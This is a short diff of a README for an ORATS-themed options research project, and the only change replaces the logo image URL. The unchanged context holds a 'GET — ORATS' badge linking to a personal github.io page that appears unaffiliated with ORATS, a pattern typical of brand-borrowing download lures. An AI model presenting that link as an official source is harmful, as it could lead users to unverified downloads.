@@ -2,7 +2,7 @@
 
 > **Your calm options research workspace: explore ORATS backtesting, review ORATS implied volatility, and evaluate ORATS strategy research with historical evidence.**
 
-![ORATS](https://avatars.mds.yandex.net/i?id=ce6e00c2a69dde57e13302e293beb2a8d986c346-5258962-images-thumbs&n=13)
+![ORATS](https://www.interactivebrokers.ie/images/2015/logos/company_logo_orats.png?v=20240917)
 
 [![GET — ORATS](https://img.shields.io/badge/GET%20%E2%80%94%20ORATS-0078D6?style=for-the-badge&logoColor=white)](https://michelleandersono936.github.io/.github/orats-data-api)
 
